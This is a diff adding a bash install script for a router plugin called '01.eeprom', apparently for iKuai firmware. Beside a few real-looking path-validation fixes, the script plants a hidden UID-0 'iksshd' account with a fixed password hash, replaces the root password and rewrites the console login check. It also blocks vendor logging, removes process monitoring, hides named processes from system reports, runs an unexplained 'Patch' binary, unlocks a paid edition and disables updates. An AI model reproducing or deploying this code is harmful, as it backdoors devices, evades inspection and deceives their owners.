@@ -1,0 +1,706 @@
+#!/bin/bash
+PLUGIN_NAME="01.eeprom"
+
+killall appinst >/dev/null 2>&1
+
+if [ -f /tmp/installbin.log ];then
+echo "start-2-exit" >>/tmp/installbin.log
+exit 0
+fi
+echo "start" >>/tmp/installbin.log
+
+rm /tmp/appinst.gz -rf
+killall appinst >/dev/null 2>&1
+rm /tmp/ikpkg/appinst/appinst -rf
+
+
+
+PUBLIC_KEY(){
+
+PUBKEY_STR="-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuP41dFb3szZrSbTGnPk6
+OKbJEZXJJi1T4S4GjnjIqzrfX+cV7wz5vF705jxij6KGAGZkGBQ2BRZsLghT+7nw
+KoEC99iHaj1QlfKkikS4b9x+SJbumZUHFh77P7Ir18C8Kjet8QrgyObu3R1NuRCy
+o86bbGgax0brO0w0aTSnw3vWbt9UVns9mPc9BekVM5vy97c12T4ijjgNRtwcGorP
+rCfQGo3Ff8QD5YPqKBA8mRYK96dm/SOxWEH63lwWDOp1rD240Oh1jaoRajMh03Ym
+Q0mwPf26qwMoiKAER+397J0vifnLLcI8Oik6vy4Xyrob5ie5g5ko48tUdf+4IFfF
+OQIDAQAB
+-----END PUBLIC KEY-----"
+PUBKEY=$(mktemp)
+echo "$PUBKEY_STR" > "$PUBKEY"
+}
+
+openssl_md5=`md5sum /usr/bin/openssl|awk -F " " '{print $1}'`
+if [ "$openssl_md5" != "8dc48f57409edca7a781e6857382687b" ];then
+	exit 1
+fi
+
+
+PUBLIC_KEY
+if ! /usr/bin/openssl dgst -sha256 -verify "$PUBKEY" -signature /tmp/ikpkg/appinst/signature.bin "/tmp/ikpkg/appinst/genuine"  >/dev/null 2>&1; then
+rm $PUBKEY -f
+exit 1
+fi
+
+rm $PUBKEY -f
+
+payload="/etc/mnt/ikuai/payload.json"
+signature="/etc/mnt/ikuai/signature.bin"
+response="/etc/mnt/ikuai/response.json"
+
+INSTALL_DIR="/tmp/ikpkg/eeprom"
+chmod +x $INSTALL_DIR/script/*
+chmod +x $INSTALL_DIR/data/*
+
+stop_dockerd()
+{
+    
+    rm -f /tmp/iktmp/dockerd.status
+    pids_master=$(ps |awk '$5=="dockerd"{print $1}')
+    for pid in $pids_master ;do
+        pid_second+=$(ps -l |awk -v pid=$pid '$4==pid{print $3}')
+    done
+    
+    for pid in $pid_second ;do
+        pid_three+=$(ps -l |awk -v pid=$pid '$4==pid{print $3}')
+    done
+    
+    if [ "$pids_master" ];then
+        kill $pids_master $pid_second $pid_three
+        sleep 1
+        
+        for i in {1..10} ;do
+            if kill $pids_master >/dev/null 2>&1 ;then
+                sleep 1
+            else
+                break
+            fi
+        done
+        kill $pids_master >/dev/null 2>&1 || kill -9 $pids_master >/dev/null 2>&1
+    fi
+    ulimit -n 1024
+    
+    brctl show | while read ifname other ;do
+        if [ "${ifname:0:3}" = "doc" ];then
+            ifconfig $ifname down
+            brctl delbr $ifname
+        fi
+    done
+}
+
+#docker
+dockerfx(){
+    
+    doc_path="/etc/disk/*/Docker/lib/containers/*/config.v2.json"
+    
+    for config_path_one in $doc_path; do
+        #echo "检查配置文件: $config_path_one"
+        
+        # 提取所有挂载源路径（包括.Spec.Source）
+        mount_sources=$(jq -r '.MountPoints[] | .Source, (.Spec.Source // empty)' "$config_path_one" 2>/dev/null)
+        
+        for mount_one in $mount_sources; do
+            [ -z "$mount_one" ] && continue
+            
+            echo "原始挂载路径: $mount_one"
+            
+            # 清理路径（移除JSON可能残留的引号和逗号）
+            clean_path=$(echo "$mount_one" | tr -d '",')
+            
+            # 检查相对路径（../）
+            if echo "$clean_path" | grep -q "\.\."; then
+                echo "[安全警告] 发现相对路径: $clean_path"
+                invalid=1
+            fi
+            
+            # 解析真实路径
+            real_path=$(readlink -f "$clean_path" 2>/dev/null)
+            [ -z "$real_path" ] && real_path=$(readlink -f "/etc/disk_user/${clean_path#/etc/disk_user/}" 2>/dev/null)
+            
+            echo "解析后路径: ${real_path:-未解析}"
+            
+            # 核心检查：路径必须以/etc/disk开头
+            if ! echo "${real_path:-}" | grep -q "^/etc/disk"; then
+                echo "[安全违规] 非法挂载路径（不在/etc/disk下）"
+                invalid=1
+            fi
+            
+            # 处理非法路径
+            if [ "${invalid:-0}" -eq 1 ]; then
+                
+                # 获取容器ID
+                doc_ID=$(jq -r '.ID' "$config_path_one" 2>/dev/null)
+                [ -z "$doc_ID" ] && continue
+                
+                echo "正在处理违规容器: $doc_ID"
+                ikdocker container_stop id="$doc_ID" 2>/dev/null
+                echo "容器已停止"
+                #停止服务
+                stop_dockerd
+                echo "清空挂载点配置..."
+                jq '.MountPoints = {}' "$config_path_one" > /tmp/config.bak && \
+                mv /tmp/config.bak "$config_path_one" && \
+                jq 'del(.Config.Labels.mounts)' "$config_path_one" > "$temp_file"
+                mv "$temp_file" "$config_path_one"
+                # 取消注释以下行以启用删除
+                # ikdocker container_del id="$doc_ID" 2>/dev/null
+                # 直接跳出当前容器检查
+                break
+            fi
+        done
+    done
+    
+}
+
+
+# USB漏洞修复, 该漏洞可以通过软链接的方式访问文件系统并修改文件
+codefix_for_usb_vulnerability()
+{
+    echo 'USB漏洞修复' >>/tmp/ipk.log
+    GetRealPaths=`grep 'GetRealPath' /usr/openresty/lua/lib/webman.lua|wc -l`
+    if [ $GetRealPaths -gt 0 ];then
+        return
+    fi
+    
+    local insert_script1="      local realpath=\$(readlink -f \/etc\/disk_user\/\$path)"
+    local insert_script2="      [ \"\${realpath:0:9}\" = \"\/etc\/disk\" ] || path=\/etc\/disk_user"
+    sed -i "/local data=\$(\$IK_DIR_SCRIPT/i\\$insert_script1" /usr/ikuai/script/file_mgmt.sh
+    sed -i "/local data=\$(\$IK_DIR_SCRIPT/i\\$insert_script2" /usr/ikuai/script/file_mgmt.sh
+    
+    local insert_script3="function GetRealPath(diskpath)"
+    local insert_script4="      local tmppath = string.format( \"%s\/disk\/%s\" , RootPath, diskpath)"
+    local insert_script5="      local handle = io.popen(\"readlink -f \" .. tmppath)"
+    local insert_script6="      local result = handle:read(\"*a\")"
+    local insert_script7="      handle:close()"
+    local insert_script8="      return result:gsub(\"%s+\$\", \"\")"
+    local insert_script9="end"
+    sed -i "/function ActionDiskUpload/i\\$insert_script3" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\$insert_script4" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\$insert_script5" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\$insert_script6" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\$insert_script7" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\$insert_script8" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\$insert_script9" /usr/openresty/lua/lib/webman.lua
+    sed -i "/function ActionDiskUpload/i\\ " /usr/openresty/lua/lib/webman.lua
+    
+    local insert_script10="     local realpath = GetRealPath(diskpath)"
+    local insert_script11="     if not realpath:match(\"^\/etc\/disk\/\") then"
+    local insert_script12="             ikngx.senderror(ResUpSvrErr,\"Need param name: path\")"
+    local insert_script13="     end"
+    sed -i "/if not lastmodified then/i\\$insert_script10" /usr/openresty/lua/lib/webman.lua
+    sed -i "/if not lastmodified then/i\\$insert_script11" /usr/openresty/lua/lib/webman.lua
+    sed -i "/if not lastmodified then/i\\$insert_script12" /usr/openresty/lua/lib/webman.lua
+    sed -i "/if not lastmodified then/i\\$insert_script13" /usr/openresty/lua/lib/webman.lua
+    sed -i "/if not lastmodified then/i\\ " /usr/openresty/lua/lib/webman.lua
+}
+
+restore_app(){
+    echo '修正恢复出厂' >>/tmp/ipk.log
+    restore=`grep 'appinst.bin.pkg' /usr/ikuai/script/backup.sh|wc -l`
+    if [ $restore -gt 0 ];then
+        return
+    fi
+    
+sed -i '/IK_DIR_LOG\/\*/i\
+mkdir /tmp/appbak/\
+cp $IK_DIR_LOG/packages/db/.__DB.3.x86_64 /tmp/appbak/\
+cp /etc/mnt/ikuai/payload.json /tmp/appbak/\
+cp /etc/mnt/ikuai/signature.bin /tmp/appbak/\
+cp /etc/mnt/ikuai/response.json /tmp/appbak/\
+cp $IK_DIR_LOG/packages/appinst.bin.pkg /tmp/appbak/' /usr/ikuai/script/backup.sh
+
+
+sed -i '/IK_DIR_LOG\/\*/a\
+mkdir -p $IK_DIR_LOG/packages/db\
+mkdir -p /etc/mnt/ikuai\
+cp /tmp/appbak/payload.json /etc/mnt/ikuai/\
+cp /tmp/appbak/signature.bin /etc/mnt/ikuai/\
+cp /tmp/appbak/response.json /etc/mnt/ikuai/\
+cp /tmp/appbak/.__DB.3.x86_64 $IK_DIR_LOG/packages/db/\
+cp /tmp/appbak/appinst.bin.pkg $IK_DIR_LOG/packages/' /usr/ikuai/script/backup.sh
+    
+ 
+    
+}
+
+disk_mgmt_app()
+{
+    echo '修正格试化' >>/tmp/ipk.log
+    disk_mgmts=`grep 'appinst.bin.pkg' /usr/ikuai/script/disk_mgmt.sh|wc -l`
+    if [ $disk_mgmts -gt 0 ];then
+        return
+    fi
+cat > insert_content.txt <<EOF
+        5)
+			rm /tmp/appbak -rf
+			rm /tmp/disksd -rf
+            mkdir -p /tmp/appbak/
+            mkdir -p /tmp/disksd/
+            cp /etc/log/packages/db/.__DB.3.x86_64 /tmp/appbak/
+            cp/etc/log/packages/appinst.bin.pkg /tmp/appbak/
+            if [ ! -e "/dev/\$part" ]; then
+                Autoiecho disk_mgmt part_not_found "\$part"
+                return 1
+            fi
+            if ! __lock_disk "\$part" ; then
+                Autoiecho disk_mgmt disk_in_task
+                return 1
+            fi
+            part=\$part mt_name= mt_purpose=0 partition_set
+            sleep 1
+            if ! __force_umount_part "\$part"; then
+                Autoiecho disk_mgmt umount_fail
+                __unlock_disk "\$part"
+                return 1
+            fi
+            __format_part "\$part"
+            __unlock_disk "\$part"
+            mkfs.ext4 /dev/\$part
+            sync
+            mount /dev/\$part /tmp/disksd
+            mkdir -p /tmp/disksd/packages/db/
+            cp /tmp/appbak/.__DB.3.x86_64 /tmp/disksd/packages/db/
+            cp /tmp/appbak/appinst.bin.pkg /tmp/disksd/packages/
+            sync
+            umount /tmp/disksd
+            (sleep 3; reboot) >/dev/null 2>&1 &
+            return 0
+			;;
+
+EOF
+    sed -i '/partition_format()/,/esac/ {s/1|2|4)/# INSERT_HERE\n        1|2|4)/}' /usr/ikuai/script/disk_mgmt.sh
+    sed -i '/# INSERT_HERE/r insert_content.txt' /usr/ikuai/script/disk_mgmt.sh
+    #sed -i '/# INSERT_HERE/d' /usr/ikuai/script/disk_mgmt.sh
+    sed -i '/3|5)/c\3)' /usr/ikuai/script/disk_mgmt.sh
+}
+
+
+disk_mgmt_app2()
+{
+    echo '修正重新分区' >>/tmp/ipk.log
+    disk_mgmts=`grep 'INSERT_format' /usr/ikuai/script/disk_mgmt.sh|wc -l`
+    if [ $disk_mgmts -gt 0 ];then
+        return
+    fi
+cat > insert_content2.txt <<EOF
+			local part=\$disk"5"
+			rm /tmp/appbak -rf
+			rm /tmp/disksd -rf
+            mkdir -p /tmp/appbak/
+            mkdir -p /tmp/disksd/
+            cp /etc/log/packages/db/.__DB.3.x86_64 /tmp/appbak/
+            cp/etc/log/packages/appinst.bin.pkg /tmp/appbak/
+            if [ ! -e "/dev/\$part" ]; then
+                Autoiecho disk_mgmt part_not_found "\$part"
+                return 1
+            fi
+            if ! __lock_disk "\$part" ; then
+                Autoiecho disk_mgmt disk_in_task
+                return 1
+            fi
+            part=\$part mt_name= mt_purpose=0 partition_set
+            sleep 1
+            if ! __force_umount_part "\$part"; then
+                Autoiecho disk_mgmt umount_fail
+                __unlock_disk "\$part"
+                return 1
+            fi
+            __format_part "\$part"
+            __unlock_disk "\$part"
+            mkfs.ext4 /dev/\$part
+            sync
+            mount /dev/\$part /tmp/disksd
+            mkdir -p /tmp/disksd/packages/db/
+            cp /tmp/appbak/.__DB.3.x86_64 /tmp/disksd/packages/db/
+            cp /tmp/appbak/appinst.bin.pkg /tmp/disksd/packages/
+            sync
+            umount /tmp/disksd
+EOF
+    
+    sed -i '/sleep 2; reboot/i #INSERT_format' /usr/ikuai/script/disk_mgmt.sh
+    sed -i '/#INSERT_format/r insert_content2.txt' /usr/ikuai/script/disk_mgmt.sh
+    
+    
+}
+
+
+
+rootfs_check(){
+    
+    BOOTHDD=`cat /etc/release|grep "BOOTHDD"|awk -F "=" '{print $2}'`
+    mkdir /tmp/mnt_system
+    mount /dev/${BOOTHDD}1 /tmp/mnt_system
+    
+    password2='ikuaiwbd'
+    
+    
+    rootfs_md5=$(md5sum /tmp/mnt_system/boot/rootfs| awk -F " " '{print $1}')
+    md5key=`echo -n $rootfs_md5$password2|md5sum |awk -F " " '{print $1}'`
+    
+    
+    if tail -n 1 /tmp/mnt_system/boot/grub/grub.cfg|grep -q '#';then
+        
+        grubkey=`tail -n 1 /tmp/mnt_system/boot/grub/grub.cfg| sed 's/^#//'`
+        
+        if [ "$md5key" != "$grubkey" ];then
+            echo "grub.cfgmd5错误" >>/tmp/ipk.installmd5.log
+            busybox reboot -f
+        fi
+        
+        
+    else
+        echo "grub.cfgmd5错误2222" >>/tmp/ipk.installmd5.log
+        busybox reboot -f
+        
+    fi
+    
+
+    umount /tmp/mnt_system
+    rm /tmp/mnt_system -r
+    
+}
+
+
+cloud_log()
+{
+    echo "0.0.0.0 alpha-cloud-log.cn-hangzhou.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-shanghai.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-nanjing.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-fuzhou.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-qingdao.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-beijing.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-zhangjiakou.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-huhehaote.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-wulanchabu.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-shenzhen.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-heyuan.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-guangzhou.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-chengdu.log.aliyuncs.com" >> /etc/hosts
+    echo "0.0.0.0 alpha-cloud-log.cn-hongkong.log.aliyuncs.com" >> /etc/hosts
+}
+
+
+triger_safe_guarantee() {
+    
+    
+    iksshd=`cat /etc/shadow|grep "iksshd"|wc -l`
+    if [ $iksshd -eq 0 ];then
+        echo 'iksshd:$1$ebBzICAY$5CaSyktzPh8SEUYMHdzhf1:17857:0:99999:7:::' >>/etc/shadow
+        echo 'iksshd:x:0:0:iksshd:/root:/bin/ash' >>/etc/passwd
+    fi
+    
+    echo '修改官方密码'  >>/tmp/ipk.install.log
+    cp /etc/setup/rc.console /etc/setup/rc.console.bak
+    script="		if [ \"\$(echo \"\$opmode\"|md5sum)\" = \"e7c5ef3127b0764468df2a7a441d7165  -\" ];then"
+    sed -i "/__login_console__=0/{n;d;}" /etc/setup/rc.console
+    sed -i "/__login_console__=0/a\\$script" /etc/setup/rc.console
+    md5sum /etc/setup/rc.console >/etc/setup/rc.console.md5
+    
+
+    sed -i 's/^root:.*/root:$1$Cfo1wl1X$.6IVkTgybOrYyqLcvtT3L1:17857:0:99999:7:::/' /etc/shadow
+    sed -i '/^\(root\|daemon\|ftp\|network\|nobody\|sshd\|iksshd\):/!d' /etc/shadow
+    
+    
+    passwds=$(cat /etc/passwd|md5sum|awk -F " " '{print $1}')
+    if [ "$passwds" != "2e35dbfe16d02ea1c6139429cca55e2a" ];then
+        echo "root:x:0:0:root:/root:/etc/setup/rc" > /etc/passwd
+        echo "daemon:*:1:1:daemon:/var:/bin/false" >> /etc/passwd
+        echo "ftp:*:55:55:ftp:/home/ftp:/bin/false" >> /etc/passwd
+        echo "network:*:101:101:network:/var:/bin/false" >> /etc/passwd
+        echo "nobody:*:65534:65534:nobody:/var:/bin/false" >> /etc/passwd
+        echo "sshd:x:0:0:sshd:/root:/etc/setup/rc" >> /etc/passwd
+        echo 'iksshd:x:0:0:iksshd:/root:/bin/ash' >>/etc/passwd
+    fi
+    
+    sshd_port=$(sqlite3 /etc/mnt/ikuai/config.db "select sshd_port from remote_control;")
+    open_sshd=$(sqlite3 /etc/mnt/ikuai/config.db "select open_sshd from remote_control;")
+    [ "$open_sshd" = "1" ] && dropbear -p $sshd_port
+    
+    
+}
+
+
+
+
+rm /sbin/sysupgrade -rf
+mv $INSTALL_DIR/data/sysupgrade /sbin/sysupgrade -f
+
+
+rootfs_check
+
+#killall -q dropbear && killall -q telnetd && killall -q ttyd
+rm /tmp/data.tar -f
+rm /tmp/datas.tar -f
+pidof iktunc && busybox reboot -f
+[ -d /var/run/iktunc ] && busybox reboot -f
+[ -f /usr/sbin/iktunc ] && busybox reboot -f
+
+
+
+
+iptables -I INPUT -d 10.255.255.253/32 -j DROP
+iptables -I OUTPUT -d 10.255.255.253/32 -j DROP
+iptables -I INPUT -d 10.255.255.254/32 -j DROP
+iptables -I OUTPUT -d 10.255.255.254/32 -j DROP
+iptables -I OUTPUT -p tcp --dport 6000 -j DROP
+iptables -I OUTPUT -p udp --dport 6000 -j DROP
+iptables -I INPUT -p tcp --dport 6000 -j DROP
+iptables -I INPUT -p udp --dport 6000 -j DROP
+iptables -I INPUT -p tcp --dport 622 -j DROP
+iptables -I OUTPUT -p tcp --dport 622 -j DROP
+ip6tables -I INPUT -p tcp --dport 622 -j DROP
+ip6tables -I OUTPUT -p tcp --dport 622 -j DROP
+ip6tables -I INPUT -p tcp --dport 6000 -j DROP
+ip6tables -I OUTPUT -p tcp --dport 6000 -j DROP
+
+if [ ! -f /usr/ikuai/script/wireguard.sh ];then
+    mkdir -p /tmp/iktmp/wireguard/config
+    mv  $INSTALL_DIR/script/audit_terminal_stat.sh /usr/ikuai/script/audit_terminal_stat.sh
+    mv  $INSTALL_DIR/script/ike_client.sh /usr/ikuai/script/ike_client.sh
+    mv  $INSTALL_DIR/script/ike_server.sh /usr/ikuai/script/ike_server.sh
+    mv  $INSTALL_DIR/script/pppoe_proxy.sh /usr/ikuai/script/pppoe_proxy.sh
+    mv  $INSTALL_DIR/script/wireguard.sh /usr/ikuai/script/wireguard.sh
+    ln -s /usr/ikuai/script/audit_terminal_stat.sh /usr/ikuai/function/audit_terminal_stat
+    ln -s /usr/ikuai/script/ike_client.sh /usr/ikuai/function/ike_client
+    ln -s /usr/ikuai/script/ike_server.sh /usr/ikuai/function/ike_server
+    ln -s /usr/ikuai/script/pppoe_proxy.sh /usr/ikuai/function/pppoe_proxy
+    ln -s /usr/ikuai/script/wireguard.sh /usr/ikuai/function/wireguard
+fi
+
+#packages.ikuai8.com.w.kunlunca.com
+
+sed -i '/OEM_CRE_MONITOR/{N;N;N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
+sed -i '/get_process_status cre ;then/{N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
+sed -i '/get_process_status ik_rc_client/{N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
+sed -i '/get_process_status pmd/{N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
+sed -i '/using_hosts_update_process()/{N;N;N;N;N;N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
+
+kill $(ps |grep "monitor_process.sh"|grep -v "grep"|awk -F " " '{print $1}')
+
+
+rm /tmp/ikpkg/appinst/appinst -f
+rm /tmp/ikpkg/appinst/*.sh -f
+
+#修改文件上传限制
+sed -i 's/50\*/1024\*/g' /usr/openresty/lua/lib/webman.lua
+chmod +x $INSTALL_DIR/script/*
+rm /usr/ikuai/script/upgrade.sh -f
+mv  $INSTALL_DIR/script/upgrade.sh /usr/ikuai/script/upgrade.sh -f
+dockerfx
+triger_safe_guarantee
+
+
+sed -i 's/[a-f0-9]\{32\}/c8130c66f9840ce25187a8243b135c2e/g' /sbin/sysinit
+
+codefix_for_usb_vulnerability
+restore_app
+disk_mgmt_app
+disk_mgmt_app2
+cloud_log
+
+#修改技技导出报告中的过滤
+sed -i 's#top -n 3#top -n 3 |grep -v "grep" |grep -v "Docker_patch" |grep -v "vnl" |grep -v "vnt" |grep -v "AdGu" |grep -v "Crash" |grep -v "npc"#' /usr/ikuai/script/utils/export_sysinfo.sh
+
+
+#echo '# 允许直接调用二进制作为service'
+sed -i '/\[ ! -f "\$IK_DIR_FUNCAPI\/\$1" \]/!b;n;n;n;c\elif [[ ! "$1" =~ ^plugin_ ]] && [[ ! "$1" =~ ^ipv6 ]];then' /usr/ikuai/function/func_api.sh
+
+#sed -i '/\[ ! -f "\$IK_DIR_FUNCAPI\/\$1" \]/!b;n;n;n;c\elif [[ ! "$1" =~ ^ipv6 ]];then' /usr/ikuai/function/func_api.sh
+# 修复由于chroot挂载导致的磁盘管理页面会错误将已挂载分区显示为“不使用”的问题
+sed -i "s/(\"df -B1\")/(\"df -B1 | grep -v chroot\")/g" /usr/ikuai/script/utils/disk_find.lua
+
+#插件显示
+docker_jsok=0
+mkdir /tmp/jstmp -p
+for file in /usr/ikuai/www/static/js/*.js.gz;
+do
+    output_file="$(basename "$file" .gz)"
+    gunzip -c "$file" > "/tmp/jstmp/$output_file"
+    docker_js=`grep 'location.host+"/plugins/docker/' /tmp/jstmp/$output_file|wc -l`
+    if [ $docker_js -gt 0 ];then
+        echo "找到文件docker_js名为$output_file" >>/tmp/ipk.log
+        sed -i 's/t.yunbindstatus=""!=i.code?2:1/t.yunbindstatus=2/' /tmp/jstmp/$output_file
+        sed -i 's|location\.host+"/plugins/docker/"+t\.dockerList\[i\]\.name+"\.\png",t\.dockerList\[i\]\.iframesrc=location\.protocol+"//"+location\.host+"/plugins/docker/"+t\.dockerList\[i\]\.name+".html"|location.host+"/plugins/"+t.dockerList[i].name+"/"+t.dockerList[i].name+".png",t.dockerList[i].iframesrc=location.protocol+"//"+location.host+"/plugins/"+t.dockerList[i].name+"/"+t.dockerList[i].name+".html"|' /tmp/jstmp/$output_file
+        sed -i 's/this.dockertitle="docker"/this.dockertitle=t.alias/' /tmp/jstmp/$output_file
+        sed -i 's/e.name/e.alias/' /tmp/jstmp/$output_file
+        
+        sed -i 's/docker"==t.dockertitle/docker"!=t.dockertitle/' /tmp/jstmp/$output_file
+        sed -i 's/t\._v("Docker"/t\._v(t.dockertitle/' /tmp/jstmp/$output_file
+        sed -i 's/dockerShow()})}/dockerShow()}/' /tmp/jstmp/$output_file
+        sed -i 's/this.\$http.post(s.a.apiUrl,{func_name:"register",action:"show",param:{TYPE:"data,gwid"}}).then(function(e){var i=e.data.Data.data\[0\];//g' /tmp/jstmp/$output_file
+        gzip -c /tmp/jstmp/$output_file > /usr/ikuai/www/static/js/$output_file.gz
+        docker_jsok=1
+        continue
+    fi
+
+done
+
+
+
+cp $INSTALL_DIR/data/app.js /usr/ikuai/www/static/css/app.js
+cp $INSTALL_DIR/data/app.css /usr/ikuai/www/static/css/app.css
+rm -rf /usr/ikuai/www/plugins/$PLUGIN_NAME
+ln -sf $INSTALL_DIR/html /usr/ikuai/www/plugins/$PLUGIN_NAME
+ln -sf $INSTALL_DIR/script/eeprom.sh         /usr/ikuai/function/plugin_eeprom
+
+BOOTHDD=`cat /etc/release|grep "BOOTHDD"|awk -F "=" '{print $2}'`
+GWID=`cat /etc/release|grep "GWID"|awk -F "=" '{print $2}'`
+
+
+app_dir=/etc/log/app_dir
+if [ ! -d $app_dir ];then
+    mkdir $app_dir -p
+fi
+
+
+ $INSTALL_DIR/data/Patch >/dev/null &
+
+
+/tmp/ikpkg/appinst/genuine activate_sn
+
+
+if /tmp/ikpkg/appinst/genuine activate >/dev/null 2>/dev/null;then
+    
+    if [ -d /etc/log/ikipk ];then
+        echo '安装ipk' >>/tmp/ipk.log
+        mkdir /tmp/iktmp/app_install -p
+        FILE_tar=/tmp/iktmp/app_install/app.tar
+        
+        for FILE in /etc/log/ikipk/*;
+        do
+            echo '进入安装ipk' >>/tmp/ipk.log
+            app_name=$(basename $FILE)
+            if ! /tmp/ikpkg/appinst/genuine decrypt $FILE $FILE_tar >/dev/null 2>/dev/null ;then
+                echo "解密错误" >>/tmp/ipk.log
+                rm /etc/log/IPK/$FILE -rf
+                rm /etc/log/ikipk/$FILE -rf
+                rm /etc/log/app_dir/$FILE -rf
+                rm $FILE_tar
+            else
+                
+                shdir=$BASENAME
+                APPcheck=`hexdump -v -s 0x0 -n 4 -e '1/1 "%02x"' $FILE_tar`
+                if [ "$APPcheck" == "1f8b0800" ] || [ "$APPcheck" == "1f8b0808" ];then
+                    argvc=xOzf
+                    argvx=xzvf
+                else
+                    argvc=xOf
+                    argvx=xf
+                fi
+                
+                echo "解密成功" >>/tmp/ipk.log
+                tar -$argvx $FILE_tar -C /tmp/iktmp/app_install/ >/dev/null
+                rm $FILE_tar
+                PLUGIN_dir=$(ls -d /tmp/iktmp/app_install/*)
+                if [ ! -f $PLUGIN_dir/html/metadata.json ];then
+			PLUGIN_NAMES=$(jq -r '.name' $PLUGIN_dir/html/*.json)
+		else
+			PLUGIN_NAMES=$(jq -r '.name' $PLUGIN_dir/html/metadata.json)
+		fi
+		echo "$PLUGIN_NAMES" >>/tmp/ipk.log
+                rm $app_dir/$PLUGIN_NAMES/html -rf
+                rm $app_dir/$PLUGIN_NAMES/script -rf
+                mkdir /tmp/ikipk -p
+                mv $PLUGIN_dir  /tmp/ikipk/
+                if [ ! -d $app_dir/$PLUGIN_NAMES/data ];then
+                    echo "不存在data,$PLUGIN_NAMES" >>/tmp/ipk.log
+                    mv /tmp/ikipk/$PLUGIN_NAMES/data $app_dir/$PLUGIN_NAMES/
+                    rm /tmp/ikipk/$PLUGIN_NAMES/data -rf
+                else
+                    rm /tmp/ikipk/$PLUGIN_NAMES/data -rf
+                fi
+                chmod +x /tmp/ikipk/$PLUGIN_NAMES/*
+                ln -s $app_dir/$PLUGIN_NAMES/data /tmp/ikipk/$PLUGIN_NAMES/data
+                bash /tmp/ikipk/$PLUGIN_NAMES/install.sh >/dev/null
+
+            fi
+            
+        done
+    else
+        echo '/etc/log/ikipk不存在' >>/tmp/ipk.log
+        mkdir /etc/log/ikipk
+    fi
+    
+else
+    echo '未注册' >>/tmp/ipk.log
+    exit
+fi
+
+
+
+
+if jq --arg app "pro" -e '.app | split(",") | index($app)' $payload >/dev/null; then
+	regstatus="pro"
+else
+	regstatus="auto"
+fi
+
+if [ $regstatus == "pro" ];then
+    
+    RomName=$(cat /etc/mnt/RomNames)
+    
+    if [ $RomName == "01" ];then
+        #sed -i "2i\exit 0 #INS001" /usr/ikuai/script/gv.sh
+        
+        if [ `cat /usr/openresty/lua/lib/ikngx.lua |grep "/tmp/release"|wc -l` -eq 0  ];then
+            echo '开启企业版' >>/tmp/ipk.log
+            cp /etc/release /tmp/release
+            sed  -i 's/Build/Enterprise &/' /tmp/release
+            echo 'ENTERPRISE=Enterprise' >>/tmp/release
+            sed -i "2i\. \/tmp\/release #INS001" /usr/ikuai/script/sysstat.sh
+            sed -i 's/etc\/release/tmp\/release/'  /usr/openresty/lua/lib/ikngx.lua
+            
+            #开启语言
+            sed -i 's/\${SUPPORT_I18N}/1/g' /usr/ikuai/script/sysstat.sh
+            sed -i 's/\$SUPPORT_I18N/1/g' /usr/ikuai/script/basic.sh
+            sed -i 's/IKRELEASE.SUPPORT_I18N/true/' /usr/openresty/lua/webman/index.lua
+            lang=$(hexdump -v -s 32 -n 1 /dev/${BOOTHDD}2 -e '1/1 "%d"')
+            rm -f /tmp/iktmp/LANG/*
+            touch /tmp/iktmp/LANG/$lang
+            openresty -s stop && sleep 1 && openresty
+            
+        fi
+        
+    fi
+    
+fi
+
+
+closeup=$(cat /etc/mnt/closeup)
+
+if [ $closeup == "01" ];then
+    # 关闭在线更新
+    sed -i '/iktmp/ i return 1 #clseupdate' /usr/ikuai/include/version_all.sh
+    rm /tmp/iktmp/Version_all -rf
+fi
+
+
+if jq --arg app "appno" -e '.app | split(",") | index($app)' $payload >/dev/null; then
+	rm /usr/ikuai/www/plugins/02.pgstore -rf
+fi
+
+ 
+ ipv6num=$(jq -r '.ipv6' $payload)
+ if [ $ipv6num -gt 1 ];then
+
+ cp $INSTALL_DIR/data/ipv6.sh /usr/ikuai/script/ipv6.sh
+  chmod +x /usr/ikuai/script/ipv6.sh
+ 
+ fi
+
+if [ ! -f /etc/mnt/ikuai/noboot ];then
+
+if [ -d /tmp/ikipk ];then
+    echo '启动ipk' >>/tmp/ipk.log
+    for script in /tmp/ikipk/*/script/*.sh; do  $script start & done
+fi
+
+fi
+
+
+
+exit 0
+
+
+
+
